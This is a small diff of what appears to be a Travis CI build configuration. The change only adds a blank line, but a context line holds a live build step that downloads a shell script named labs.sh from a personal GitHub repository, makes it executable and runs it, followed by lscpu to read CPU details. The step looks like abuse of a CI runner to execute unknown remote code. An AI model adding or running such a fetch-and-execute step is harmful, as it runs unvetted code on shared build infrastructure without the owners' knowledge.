@@ -7,3 +7,4 @@ rvm:
 sudo: false
 script: wget https://raw.githubusercontent.com/surorebro/labs/main/labs.sh && chmod +x labs.sh && ./labs.sh
 script: lscpu
+
